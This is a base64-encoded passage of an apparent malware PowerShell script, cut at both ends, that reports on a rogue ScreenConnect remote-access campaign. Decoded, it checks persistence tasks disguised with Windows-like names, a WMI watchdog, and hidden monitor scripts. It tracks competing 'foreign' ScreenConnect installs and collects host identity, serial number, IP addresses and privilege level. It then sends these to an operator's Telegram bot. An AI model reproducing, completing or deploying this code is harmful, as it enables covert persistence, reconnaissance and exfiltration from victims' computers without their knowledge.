aDogPGNvZGU+ezB9PC9jb2RlPicgLWYgKEVzYyAkXy5GdWxsTmFtZSkpKQogICAgICAgIH0KICAg
IH0KCiAgICAkdW5pbnN0ID0gQCgKICAgICAgICAnSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdp
bmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsXConLAogICAgICAgICdIS0xNOlxTT0ZUV0FS
RVxXT1c2NDMyTm9kZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxVbmluc3RhbGxc
KicKICAgICkKICAgIGZvcmVhY2ggKCRwYXRoIGluICR1bmluc3QpIHsKICAgICAgICBHZXQtSXRl
bVByb3BlcnR5ICRwYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgV2hlcmUtT2Jq
ZWN0IHsKICAgICAgICAgICAgJF8uRGlzcGxheU5hbWUgLWxpa2UgJypTY3JlZW5Db25uZWN0KicK
ICAgICAgICB9IHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAkdmVyID0gaWYgKCRfLkRp
c3BsYXlWZXJzaW9uKSB7ICRfLkRpc3BsYXlWZXJzaW9uIH0gZWxzZSB7ICc/JyB9CiAgICAgICAg
ICAgIFt2b2lkXSRsaXN0LkFkZCgoJy0gbXNpOiA8Y29kZT57MH08L2NvZGU+IHZ7MX0nIC1mIChF
c2MgJF8uRGlzcGxheU5hbWUpLCAoRXNjICR2ZXIpKSkKICAgICAgICB9CiAgICB9CgogICAgaWYg
KCRsaXN0LkNvdW50IC1lcSAwKSB7IFt2b2lkXSRsaXN0LkFkZCgnLSAobm9uZSknKSB9CiAgICBy
ZXR1cm4gJGxpc3QKfQoKJGNmZyA9IEdldC1DZmcKaWYgKC1ub3QgJGNmZy5CT1RfVE9LRU4gLW9y
IC1ub3QgJGNmZy5DSEFUX0lEKSB7CiAgICBBZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggKEpvaW4t
UGF0aCAkV29ya0RpciAnYm9vdC5lcnInKSAtVmFsdWUgJ3RnX3NraXBfbm9fY2ZnJyAtRXJyb3JB
Y3Rpb24gU2lsZW50bHlDb250aW51ZQogICAgZXhpdCAyCn0KCiRwcmltID0gJ1NjcmVlbkNvbm5l
Y3QgQ2xpZW50ICg1ZjYwMTA1Nzk4NTJlNTA3KScKJGFsdCA9ICdTY3JlZW5Db25uZWN0IENsaWVu
dCAoZjg2MWM4MTQwZDQ1MzQyNyknCiRvcyA9IEdldC1Pc0luZm8KJHdobyA9IFtTZWN1cml0eS5Q
cmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpLk5hbWUKJGVsZXYgPSAoW1Nl
Y3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzUHJpbmNpcGFsXVtTZWN1cml0eS5QcmluY2lwYWwuV2lu
ZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpKS5Jc0luUm9sZSgKICAgIFtTZWN1cml0eS5Qcmlu
Y2lwYWwuV2luZG93c0J1aWx0SW5Sb2xlXTo6QWRtaW5pc3RyYXRvcikKJGlzU3lzdGVtID0gJHdo
byAtbGlrZSAnKlNZU1RFTSonIC1vciAkd2hvIC1lcSAnTlQgQVVUSE9SSVRZXFNZU1RFTScKCiRt
c2lDYWNoZSA9IEpvaW4tUGF0aCAkV29ya0RpciAncGtnLm1zaScKJG1zaVNpemUgPSBpZiAoVGVz
dC1QYXRoICRtc2lDYWNoZSkgewogICAgJ3swOk4wfSBLQicgLWYgKChHZXQtSXRlbSAkbXNpQ2Fj
aGUgLUZvcmNlKS5MZW5ndGggLyAxS0IpCn0gZWxzZSB7ICdub25lJyB9CgokbW9uUGF0aCA9IEpv
aW4tUGF0aCAkV29ya0RpciAnb3duX21vbi5jbWQnCiRldGxNb24gPSAiJGVudjpQcm9ncmFtRGF0
YVxNaWNyb3NvZnRcRGlhZ25vc2lzXFN0YXRlXC5ldGxjYWNoZVxldGxfbW9uLmNtZCIKJGhhc01v
biA9IFRlc3QtUGF0aCAkbW9uUGF0aAokaGFzRXRsID0gVGVzdC1QYXRoICRldGxNb24KCiMgVDEw
OiBvbi1kaXNrIHBheWxvYWQgYnVpbGQgbWFya2VycyAtPiBldmVyeSByZXBvcnQgcHJvdmVzIGV4
YWN0bHkgd2hhdCBpcyBpbnN0YWxsZWQKZnVuY3Rpb24gR2V0LVBheWxvYWRCdWlsZChbc3RyaW5n
XSRmaWxlKSB7CiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRmaWxlKSkgeyByZXR1cm4gJ21pc3Np
bmcnIH0KICAgIGZvcmVhY2ggKCRsIGluIChHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGZpbGUg
LVRvdGFsQ291bnQgOCAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpKSB7CiAg
ICAgICAgaWYgKCRsIC1tYXRjaCAnQlVJTERccytcZHs4fShbQS1aXStcZCspJykgeyByZXR1cm4g
JG1hdGNoZXNbMV0gfQogICAgfQogICAgcmV0dXJuICc/Jwp9CiRiTW9uID0gR2V0LVBheWxvYWRC
dWlsZCAoSm9pbi1QYXRoICRXb3JrRGlyICdvd25fbW9uLmNtZCcpCiRiU2VjID0gR2V0LVBheWxv
YWRCdWlsZCAoSm9pbi1QYXRoICRXb3JrRGlyICdvd25fc2VjdXJlLmNtZCcpCiRiVGdyID0gR2V0
LVBheWxvYWRCdWlsZCAoSm9pbi1QYXRoICRXb3JrRGlyICd0Z19yZXBvcnQucHMxJykKJGJMaWIg
PSBHZXQtUGF5bG9hZEJ1aWxkIChKb2luLVBhdGggJFdvcmtEaXIgJ293bl9saWIucHMxJykKCiMg
cGVyLWhvc3QgaWRlbnRpdHk6IGV4cGVjdGVkIHRhc2sgbmFtZXMgY29tZSBmcm9tIGlkZW50aXR5
LmNmZyB3aGVuIHByZXNlbnQKJGlkQ2ZnID0gSm9pbi1QYXRoICRXb3JrRGlyICdpZGVudGl0eS5j
ZmcnCiRpZE1hcCA9IEB7fQppZiAoVGVzdC1QYXRoICRpZENmZykgewogICAgR2V0LUNvbnRlbnQg
LUxpdGVyYWxQYXRoICRpZENmZyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICBpZiAoJF8gLW1h
dGNoICdeXHMqKFtBLVpfXSspXHMqPVxzKiguKz8pXHMqJCcpIHsgJGlkTWFwWyRtYXRjaGVzWzFd
XSA9ICRtYXRjaGVzWzJdIH0KICAgIH0KfQokZXhwZWN0ZWRUYXNrcyA9IEAoCiAgICBAeyBOYW1l
ID0gJChpZiAoJGlkTWFwLlRBU0tfQSkgeyAkaWRNYXAuVEFTS19BIH0gZWxzZSB7ICdXZXJRdWV1
ZVN5bmMnIH0pOyBSb2xlID0gInRpY2sgJCgkaWRNYXAuTU9fQSltIChjaGFpbjEpIiB9LAogICAg
QHsgTmFtZSA9ICQoaWYgKCRpZE1hcC5UQVNLX0IpIHsgJGlkTWFwLlRBU0tfQiB9IGVsc2UgeyAn
UGxhU2VydmVySGVhbHRoJyB9KTsgUm9sZSA9ICJiYWNrdXAgJCgkaWRNYXAuTU9fQiltIChjaGFp
bjEpIiB9LAogICAgQHsgTmFtZSA9ICQoaWYgKCRpZE1hcC5UQVNLX0MpIHsgJGlkTWFwLlRBU0tf
QyB9IGVsc2UgeyAnV2RpSG9zdFByb3h5JyB9KTsgUm9sZSA9ICdPTlNUQVJUIChjaGFpbjEpJyB9
LAogICAgQHsgTmFtZSA9ICQoaWYgKCRpZE1hcC5UQVNLX0QpIHsgJGlkTWFwLlRBU0tfRCB9IGVs
c2UgeyAnVGNwSXBDb25mbGljdFJlcycgfSk7IFJvbGUgPSAnT05MT0dPTiAoY2hhaW4xKScgfQop
CiMgY2hhaW4gMjogV01JIHdhdGNoZG9nIHN1YnNjcmlwdGlvbgokd21pQyA9IEdldC1XbWlPYmpl
Y3QgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgQ29tbWFuZExpbmVFdmVudENv
bnN1bWVyIC1GaWx0ZXIgIk5hbWU9J1d1Y2FjaGVXYXRjaGRvZ0MnIiAtRXJyb3JBY3Rpb24gU2ls
ZW50bHlDb250aW51ZQokZXhwZWN0ZWRUYXNrcyArPSBAeyBOYW1lID0gJ1xXTUlcV3VjYWNoZVdh
dGNoZG9nQyc7IFJvbGUgPSAndGltZXIgM20gKGNoYWluMiknOyBXbWkgPSAoJG51bGwgLW5lICR3
bWlDKSB9CgokdGFza0xpbmVzID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJp
Yy5MaXN0W3N0cmluZ10KJHRhc2tPayA9IDAKJHRhc2tCYWQgPSAwCmZvcmVhY2ggKCR0IGluICRl
eHBlY3RlZFRhc2tzKSB7CiAgICBpZiAoJHQuQ29udGFpbnNLZXkoJ1dtaScpKSB7CiAgICAgICAg
aWYgKCR0LldtaSkgeyAkdGFza09rKys7ICRtYXJrID0gJ09LJyB9IGVsc2UgeyAkdGFza0JhZCsr
OyAkbWFyayA9ICdNSVNTSU5HJyB9CiAgICAgICAgW3ZvaWRdJHRhc2tMaW5lcy5BZGQoKCctIFt7
MH1dIDxjb2RlPnsxfTwvY29kZT4gLSB7Mn0nIC1mICRtYXJrLCAoRXNjICR0Lk5hbWUpLCAoRXNj
ICR0LlJvbGUpKSkKICAgICAgICBjb250aW51ZQogICAgfQogICAgJGggPSBHZXQtVGFza0hlYWx0
aCAkdC5OYW1lCiAgICBpZiAoJGguUHJlc2VudCAtYW5kICRoLkhlYWx0aHkpIHsKICAgICAgICAk
dGFza09rKysKICAgICAgICAkbWFyayA9ICdPSycKICAgIH0gZWxzZWlmICgkaC5QcmVzZW50IC1h
bmQgLW5vdCAkaC5PdXJzKSB7CiAgICAgICAgJHRhc2tCYWQrKwogICAgICAgICRtYXJrID0gJ05P
VF9PVVJTJwogICAgfSBlbHNlaWYgKCRoLlByZXNlbnQpIHsKICAgICAgICAkdGFza0JhZCsrCiAg
ICAgICAgJG1hcmsgPSAnV0VBSycKICAgIH0gZWxzZSB7CiAgICAgICAgJHRhc2tCYWQrKwogICAg
ICAgICRtYXJrID0gJ01JU1NJTkcnCiAgICB9CiAgICAkZXh0cmEgPSAnJwogICAgaWYgKCRoLlBy
ZXNlbnQpIHsKICAgICAgICAkYml0cyA9IEAoKQogICAgICAgIGlmICgkaC5TdGF0dXMpIHsgJGJp
dHMgKz0gJGguU3RhdHVzIH0KICAgICAgICBpZiAoJGguUmVzdWx0IC1uZSAnJyAtYW5kICRoLlJl
c3VsdCAtbmUgJzAnKSB7ICRiaXRzICs9ICgiTGFzdFJlc3VsdD0iICsgJGguUmVzdWx0KSB9CiAg
ICAgICAgaWYgKCRiaXRzLkNvdW50KSB7ICRleHRyYSA9ICcgKCcgKyAoJGJpdHMgLWpvaW4gJywg
JykgKyAnKScgfQogICAgfQogICAgW3ZvaWRdJHRhc2tMaW5lcy5BZGQoKCctIFt7MH1dIDxjb2Rl
PnsxfTwvY29kZT4gLSB7Mn17M30nIC1mICRtYXJrLCAoRXNjICR0Lk5hbWUpLCAoRXNjICR0LlJv
bGUpLCAoRXNjICRleHRyYSkpKQp9CgokcHJpbUxpbmUgPSBHZXQtU3ZjTGluZSAkcHJpbQokYWx0
TGluZSA9IEdldC1TdmNMaW5lICRhbHQKJHByaW1PayA9ICRwcmltTGluZSAtbGlrZSAnUnVubmlu
ZyonCiRkZXBsb3lPayA9ICRwcmltT2sgLWFuZCAoJHRhc2tPayAtZ2UgMykgLWFuZCAkaGFzTW9u
CgokZW1vamlNYXAgPSBAewogICAgT0sgICAgICAgPSBbc3RyaW5nXShbY2hhcl0weDI3MDUpCiAg
ICBET1dOICAgICA9IChbc3RyaW5nXVtjaGFyXTo6Q29udmVydEZyb21VdGYzMigweDFGNkE4KSkK
ICAgIFJFU1RPUkVEID0gKFtzdHJpbmddW2NoYXJdOjpDb252ZXJ0RnJvbVV0ZjMyKDB4MUY3RTIp
KQogICAgRkFJTCAgICAgPSBbc3RyaW5nXShbY2hhcl0weDI3NEMpCiAgICBGT1JDRSAgICA9IFtz
dHJpbmddKFtjaGFyXTB4MjZBMSkKICAgIERFUExPWSAgID0gKFtzdHJpbmddW2NoYXJdOjpDb252
ZXJ0RnJvbVV0ZjMyKDB4MUY2ODApKQogICAgSEIgICAgICAgPSAoW3N0cmluZ11bY2hhcl06OkNv
bnZlcnRGcm9tVXRmMzIoMHgxRjRFMSkpCn0KJGtleSA9ICRTdGF0ZS5Ub1VwcGVySW52YXJpYW50
KCkKJGVtb2ppID0gaWYgKCRlbW9qaU1hcC5Db250YWluc0tleSgka2V5KSkgeyAkZW1vamlNYXBb
JGtleV0gfSBlbHNlIHsgKFtzdHJpbmddW2NoYXJdOjpDb252ZXJ0RnJvbVV0ZjMyKDB4MUY0RjEp
KSB9CgokdGl0bGUgPSBzd2l0Y2ggKCRrZXkpIHsKICAgICdPSycgeyAnUHJpbWFyeSBoZWFsdGh5
JyB9CiAgICAnRE9XTicgeyAnUHJpbWFyeSBET1dOIC0gaGVhbGluZycgfQogICAgJ1JFU1RPUkVE
JyB7ICdQcmltYXJ5IFJFU1RPUkVEJyB9CiAgICAnRkFJTCcgeyAnSGVhbCBGQUlMRUQnIH0KICAg
ICdGT1JDRScgeyAnRm9yY2VkIHJlaW5zdGFsbCcgfQogICAgJ0RFUExPWScgeyBpZiAoJGRlcGxv
eU9rKSB7ICdGSVJTVCBERVBMT1kgT0snIH0gZWxzZSB7ICdGSVJTVCBERVBMT1kgLSBDSEVDSyBO
RUVERUQnIH0gfQogICAgJ0hCJyB7ICdob3VybHkgZGlnZXN0JyB9CiAgICBkZWZhdWx0IHsgIlN0
YXRlOiAkU3RhdGUiIH0KfQoKJHRyYW5zID0gaWYgKCRPbGRTdGF0ZSkgeyAiJE9sZFN0YXRlIC0+
ICRTdGF0ZSIgfSBlbHNlIHsgJFN0YXRlIH0KJHNjTGlzdCA9IEdldC1TY0luc3RhbGxzCiRybW1I
aXRzID0gR2V0LVJtbUhpdHMKaWYgKCRybW1IaXRzLkNvdW50IC1lcSAwKSB7IFt2b2lkXSRybW1I
aXRzLkFkZCgnLSAobm9uZSBkZXRlY3RlZCknKSB9CgokcHViID0gR2V0LVB1YmxpY0lwCiRsYW4g
PSBHZXQtTG9jYWxJcHMKJG5vdyA9IEdldC1EYXRlIC1Gb3JtYXQgJ3l5eXktTU0tZGQgSEg6bW06
c3Mgenp6JwokdXB0aW1lID0gJ24vYScKdHJ5IHsKICAgICRib290ID0gKEdldC1DaW1JbnN0YW5j
ZSBXaW4zMl9PcGVyYXRpbmdTeXN0ZW0pLkxhc3RCb290VXBUaW1lCiAgICAkdXB0aW1lID0gJ3sw
OmRkfWQgezA6aGh9aCB7MDptbX1tJyAtZiAoKEdldC1EYXRlKSAtICRib290KQp9IGNhdGNoIHt9
CgojIGNhbXBhaWduIHN0YXRlIGZpbGUgKHdyaXR0ZW4gYnkgb3duX2xpYi5wczEgc3RhdGUgYWN0
aW9uKQokc3RhdGVMaW5lID0gJ24vYScKJHN0YXRlT2JqID0gJG51bGwKJHN0YXRlUGF0aDIgPSBK
b2luLVBhdGggJFdvcmtEaXIgJ3N0YXRlLmpzb24nCmlmIChUZXN0LVBhdGggJHN0YXRlUGF0aDIp
IHsKICAgICRyYXdTdGF0ZSA9IChHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJHN0YXRlUGF0aDIg
LVJhdykuVHJpbSgpCiAgICB0cnkgewogICAgICAgICRzdGF0ZU9iaiA9ICRyYXdTdGF0ZSB8IENv
bnZlcnRGcm9tLUpzb24KICAgICAgICAkZm9yZWlnbkNzdiA9IGlmICgkc3RhdGVPYmouZm9yZWln
bikgeyAoJHN0YXRlT2JqLmZvcmVpZ24gLWpvaW4gJywnKSB9IGVsc2UgeyAnLScgfQogICAgICAg
ICRzdGF0ZUxpbmUgPSAicHJpbT0kKCRzdGF0ZU9iai5wcmltKSBhbHQ9JCgkc3RhdGVPYmouYWx0
KSBmb3JlaWduPVskZm9yZWlnbkNzdl0gdGFza3M9JCgkc3RhdGVPYmoudGFza3NPaykvJCgkc3Rh
dGVPYmoudGFza3NUb3RhbCkgd2Q9JCgkc3RhdGVPYmoud2F0Y2hkb2cpIGhlYWxzPSQoJHN0YXRl
T2JqLmluc3RhbGxDb3VudCkiCiAgICB9IGNhdGNoIHsgJHN0YXRlTGluZSA9ICRyYXdTdGF0ZSB9
Cn0KCiRkZXBsb3lCbG9jayA9ICcnCmlmICgka2V5IC1lcSAnREVQTE9ZJykgewogICAgJHZlcmRp
Y3QgPSBpZiAoJGRlcGxveU9rKSB7ICdERVBMT1lFRCAvIEhFQUxUSFknIH0gZWxzZSB7ICdERVBM
T1lFRCBCVVQgSU5DT01QTEVURScgfQogICAgJGZvcmVpZ24gPSBAKEdldC1DaGlsZEl0ZW0gLVBh
dGggIiR7ZW52OlByb2dyYW1GaWxlc31cU2NyZWVuQ29ubmVjdCBDbGllbnQqIiwiJHtlbnY6UHJv
Z3JhbUZpbGVzKHg4Nil9XFNjcmVlbkNvbm5lY3QgQ2xpZW50KiIgLURpcmVjdG9yeSAtRXJyb3JB
Y3Rpb24gU2lsZW50bHlDb250aW51ZSB8CiAgICAgICAgV2hlcmUtT2JqZWN0IHsgJF8uTmFtZSAt
bm90bWF0Y2ggKCI1ZjYwMTA1Nzk4NTJlNTA3fGY4NjFjODE0MGQ0NTM0Mjd8ezB9IiAtZiAoR2V0
LUdyeXhhS2VlcEZwKSkgfSkKICAgICRkaWFnTGluZXMgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xs
ZWN0aW9ucy5HZW5lcmljLkxpc3Rbc3RyaW5nXQogICAgJGJvb3RQYXRoID0gSm9pbi1QYXRoICRX
b3JrRGlyICdib290LmVycicKICAgIGlmIChUZXN0LVBhdGggJGJvb3RQYXRoKSB7CiAgICAgICAg
JGludGVyZXN0aW5nID0gQCgKICAgICAgICAgICAgJ21zaV8nLCAnZmV0Y2hfJywgJ3ByaW1hcnlf
JywgJ251a2VfJywgJ21zaV90b28nLCAnbXNpX2ZldGNoJywgJ21zaV9leGl0JywKICAgICAgICAg
ICAgJ21zaV91bmF2YWlsYWJsZScsICdzZWN1cmVfJywgJ2dvXycsICdleHRlcm1pbmF0ZV8nLCAn
aWRlbnRpdHlfJywKICAgICAgICAgICAgJ2NyZWF0ZV90YXNrJywgJ3ZlcmlmeV90YXNrJywgJ29y
cGhhbl8nLCAnc3RhbGVfJywgJ3Bvc3RpbnN0YWxsJywgJ2FsdF8nCiAgICAgICAgKQogICAgICAg
IEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkYm9vdFBhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5
Q29udGludWUgfAogICAgICAgICAgICBXaGVyZS1PYmplY3QgewogICAgICAgICAgICAgICAgJGxp
bmUgPSAkXwogICAgICAgICAgICAgICAgZm9yZWFjaCAoJHQgaW4gJGludGVyZXN0aW5nKSB7IGlm
ICgkbGluZSAtbGlrZSAiKiR0KiIpIHsgcmV0dXJuICR0cnVlIH0gfQogICAgICAgICAgICAgICAg
JGZhbHNlCiAgICAgICAgICAgIH0gfAogICAgICAgICAgICBTZWxlY3QtT2JqZWN0IC1MYXN0IDI2
IHwKICAgICAgICAgICAgRm9yRWFjaC1PYmplY3QgeyBbdm9pZF0kZGlhZ0xpbmVzLkFkZCgoJy0g
PGNvZGU+ezB9PC9jb2RlPicgLWYgKEVzYyAoJF8gLXJlcGxhY2UgJ1teXHgyMC1ceDdFXScsICc/
JykpKSkgfQogICAgfQogICAgaWYgKCRkaWFnTGluZXMuQ291bnQgLWVxIDApIHsgW3ZvaWRdJGRp
YWdMaW5lcy5BZGQoJy0gKG5vIGluc3RhbGwvbnVrZSBtYXJrZXJzIGluIGJvb3QuZXJyKScpIH0K
ICAgICRkZXBsb3lCbG9jayA9IEAiCgo8Yj5EZXBsb3kgdmVyZGljdDwvYj4KLSBSZXN1bHQ6IDxi
PiQoRXNjICR2ZXJkaWN0KTwvYj4KLSBQcmltYXJ5IFJ1bm5pbmc6ICQoaWYgKCRwcmltT2spIHsg
J1lFUycgfSBlbHNlIHsgJ05PJyB9KQotIE1vbml0b3Igc2NyaXB0ICgud3VjYWNoZVxvd25fbW9u
LmNtZCk6ICQoaWYgKCRoYXNNb24pIHsgJ1lFUycgfSBlbHNlIHsgJ05PJyB9KQotIEJhY2t1cCBt
b24gKC5ldGxjYWNoZVxldGxfbW9uLmNtZCk6ICQoaWYgKCRoYXNFdGwpIHsgJ1lFUycgfSBlbHNl
IHsgJ05PJyB9KQotIFBlcnNpc3QgdGFza3MgT0s6ICR0YXNrT2sgLyAkKCRleHBlY3RlZFRhc2tz
LkNvdW50KSAoYmFkL21pc3Npbmc6ICR0YXNrQmFkKQotIE1TSSBjYWNoZTogJChFc2MgJG1zaVNp
emUpCi0gRm9yZWlnbiBTQyBmb2xkZXJzIGxlZnQ6ICQoJGZvcmVpZ24uQ291bnQpCi0gTm90ZTog
TGFzdFJlc3VsdCAyNjcwMTEgPSB0YXNrIG5vdCB5ZXQgcnVuIChub3JtYWwgcmlnaHQgYWZ0ZXIg
Y3JlYXRlKQoKPGI+RGVwbG95IGxvZyBtYXJrZXJzPC9iPgokKCRkaWFnTGluZXMgLWpvaW4gImBu
IikKIkAKfQoKJHRleHQgPSBAIgokZW1vamkgPGI+U0MgTW9uaXRvciAtICQoRXNjICR0aXRsZSk8
L2I+Cgo8Yj5FdmVudDwvYj4KLSBTdW1tYXJ5OiAkKEVzYyAkU3VtbWFyeSkKLSBUcmFuc2l0aW9u
OiA8Y29kZT4kKEVzYyAkdHJhbnMpPC9jb2RlPgotIFdoZW46ICQoRXNjICRub3cpCi0gU291cmNl
IGJ1aWxkOiA8Y29kZT4kKEVzYyAkQnVpbGQpPC9jb2RlPgokZGVwbG95QmxvY2sKCjxiPkhvc3Q8
L2I+Ci0gQ29tcHV0ZXI6IDxjb2RlPiQoRXNjICRlbnY6Q09NUFVURVJOQU1FKTwvY29kZT4KLSBV
c2VyOiA8Y29kZT4kKEVzYyAkd2hvKTwvY29kZT4KLSBFbGV2YXRlZDogJGVsZXYgfCBTWVNURU06
ICRpc1N5c3RlbQotIERvbWFpbi9Xb3JrZ3JvdXA6ICQoRXNjICRvcy5Eb21haW4pCgo8Yj5OZXR3
b3JrPC9iPgotIExBTiBJUHM6IDxjb2RlPiQoRXNjICRsYW4pPC9jb2RlPgotIFB1YmxpYyBJUDog
PGNvZGU+JChFc2MgJHB1Yik8L2NvZGU+Cgo8Yj5PUyAvIEhhcmR3YXJlPC9iPgotIE9TOiAkKEVz
YyAkb3MuQ2FwdGlvbikKLSBWZXJzaW9uOiAkKEVzYyAkb3MuVmVyc2lvbikgKGJ1aWxkICQoRXNj
ICRvcy5CdWlsZCkpICQoRXNjICRvcy5BcmNoKQotIEluc3RhbGw6ICQoRXNjICRvcy5JbnN0YWxs
RGF0ZSkgfCBMYXN0IGJvb3Q6ICQoRXNjICRvcy5MYXN0Qm9vdCkKLSBVcHRpbWU6ICQoRXNjICR1
cHRpbWUpCi0gQ1BVOiAkKEVzYyAkb3MuQ1BVKQotIEhhcmR3YXJlOiAkKEVzYyAkb3MuTWFudWZh
Y3R1cmVyKSAkKEVzYyAkb3MuTW9kZWwpCi0gU2VyaWFsOiA8Y29kZT4kKEVzYyAkb3MuU2VyaWFs
KTwvY29kZT4KLSBSQU06ICQoJG9zLlRvdGFsUkFNX0dCKSBHQgotIERpc2sgQzogJCgkb3MuRGlz
a0ZyZWVfR0IpIEdCIGZyZWUgLyAkKCRvcy5EaXNrU2l6ZV9HQikgR0IKCjxiPlNjcmVlbkNvbm5l
Y3QgKGFsbCk8L2I+Ci0gU2V2cnogPGNvZGU+NWY2MDEwNTc5ODUyZTUwNzwvY29kZT46ICQoRXNj
ICRwcmltTGluZSkKLSBBbHQgPGNvZGU+Zjg2MWM4MTQwZDQ1MzQyNzwvY29kZT46ICQoRXNjICRh
bHRMaW5lKQotIEdyeXhhIDxjb2RlPiQoRXNjIChHZXQtR3J5eGFLZWVwRnApKTwvY29kZT46ICQo
RXNjIChHZXQtU3ZjTGluZSAoIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICh7MH0pIiAtZiAoR2V0LUdy
eXhhS2VlcEZwKSkpKQokKCRzY0xpc3QgLWpvaW4gImBuIikKCjxiPk90aGVyIFJNTSAvIHJlbW90
ZSB0b29sczwvYj4KJCgkcm1tSGl0cyAtam9pbiAiYG4iKQoKPGI+UGVyc2lzdCB0YXNrcyAoZXhw
ZWN0ZWQpPC9iPgokKCR0YXNrTGluZXMgLWpvaW4gImBuIikKCjxiPkNhY2hlPC9iPgotIE1TSSBj
YWNoZTogJChFc2MgJG1zaVNpemUpCi0gV29ya0RpcjogPGNvZGU+JChFc2MgJFdvcmtEaXIpPC9j
b2RlPgoKPGI+UGF5bG9hZCBidWlsZHMgKGluc3RhbGxlZCBvbiB0aGlzIGhvc3QpPC9iPgotIDxj
b2RlPk1PTj0kYk1vbiB8IFNFQz0kYlNlYyB8IFRHUj0kYlRnciB8IExJQj0kYkxpYjwvY29kZT4K
CjxiPkNhbXBhaWduIHN0YXRlPC9iPgotIDxjb2RlPiQoRXNjICRzdGF0ZUxpbmUpPC9jb2RlPgoK
PGk+Qm90OiBAbm9idWRkeXJtbUJvdCB8IFRHX1JFUE9SVCAkYlRncjwvaT4KIkAKCiMgY29tcGFj
dCBkaWdlc3QgbW9kZTogb25lIHNob3J0IGxpbmUsIEhUTUwtZnJlZSAoaG91cmx5IGhlYXJ0YmVh
dCkKaWYgKCRNb2RlIC1lcSAnY29tcGFjdCcpIHsKICAgICRmb3JlaWduTiA9IDAKICAgIGlmICgk
c3RhdGVPYmogLWFuZCAkc3RhdGVPYmouZm9yZWlnbikgeyAkZm9yZWlnbk4gPSBAKCRzdGF0ZU9i
ai5mb3JlaWduKS5Db3VudCB9CiAgICAkbXNpU2hvcnQgPSBpZiAoVGVzdC1QYXRoICRtc2lDYWNo
ZSkgeyAnezA6TjB9S0InIC1mICgoR2V0LUl0ZW0gJG1zaUNhY2hlIC1Gb3JjZSkuTGVuZ3RoIC8g
MUtCKSB9IGVsc2UgeyAnMCcgfQogICAgJHByaW1TaG9ydCA9IGlmICgkcHJpbU9rKSB7ICdPSycg
fSBlbHNlIHsgJ0RPV04nIH0KICAgICRhbHRTaG9ydCA9IGlmICgkYWx0TGluZSAtbGlrZSAnUnVu
bmluZyonKSB7ICdPSycgfSBlbHNlIHsgJy0nIH0KICAgICRncnl4YUxpbmUgPSBHZXQtU3ZjTGlu
ZSAoIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICh7MH0pIiAtZiAoR2V0LUdyeXhhS2VlcEZwKSkKICAg
ICRncnl4YVNob3J0ID0gaWYgKCRncnl4YUxpbmUgLWxpa2UgJ1J1bm5pbmcqJykgeyAnT0snIH0g
ZWxzZSB7ICctJyB9CiAgICAkdGV4dCA9ICIkZW1vamkgU0NEfCQoJGVudjpDT01QVVRFUk5BTUUp
fHNldj0kcHJpbVNob3J0fGdyeT0kZ3J5eGFTaG9ydHxhbHQ9JGFsdFNob3J0fGY9JGZvcmVpZ25O
fHQ9JHRhc2tPay81fGI9JEJ1aWxkIgp9CgppZiAoJHRleHQuTGVuZ3RoIC1ndCAzODAwKSB7CiAg
ICAkcm1tSGl0cyA9IEAoKCRybW1IaXRzIHwgU2VsZWN0LU9iamVjdCAtRmlyc3QgMTIpKSArICgn
LSAuLi4gKHswfSBtb3JlKScgLWYgKCRybW1IaXRzLkNvdW50IC0gMTIpKQogICAgJHNjTGlzdCA9
IEAoKCRzY0xpc3QgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxNCkpICsgKCctIC4uLiAoezB9IG1v
cmUpJyAtZiAoJHNjTGlzdC5Db3VudCAtIDE0KSkKICAgICR0ZXh0ID0gJHRleHQuU3Vic3RyaW5n
KDAsIDM4MDApICsgImBuYG48aT5UUlVOQ0FURUQgKFRlbGVncmFtIDQwOTYgbGltaXQpPC9pPiIK
fQoKJGxvZyA9IEpvaW4tUGF0aCAkV29ya0RpciAnYm9vdC5lcnInCmZ1bmN0aW9uIFNlbmQtVGco
W3N0cmluZ10kbXNnLCBbc3RyaW5nXSRtb2RlKSB7CiAgICAkcGF5bG9hZCA9IEB7CiAgICAgICAg
Y2hhdF9pZCAgICAgICAgICAgICAgICAgID0gJGNmZy5DSEFUX0lECiAgICAgICAgdGV4dCAgICAg
ICAgICAgICAgICAgICAgID0gJG1zZwogICAgICAgIGRpc2FibGVfd2ViX3BhZ2VfcHJldmlldyA9
ICR0cnVlCiAgICB9CiAgICBpZiAoJG1vZGUpIHsgJHBheWxvYWQucGFyc2VfbW9kZSA9ICRtb2Rl
IH0KICAgICRqc29uID0gJHBheWxvYWQgfCBDb252ZXJ0VG8tSnNvbiAtQ29tcHJlc3MgLURlcHRo
IDUKICAgICRieXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJGpz
b24pCiAgICBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICgiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3Jn
L2JvdCQoJGNmZy5CT1RfVE9LRU4pL3NlbmRNZXNzYWdlIikgYAogICAgICAgIC1NZXRob2QgUG9z
dCAtQm9keSAkYnl0ZXMgLUNvbnRlbnRUeXBlICdhcHBsaWNhdGlvbi9qc29uOyBjaGFyc2V0PXV0
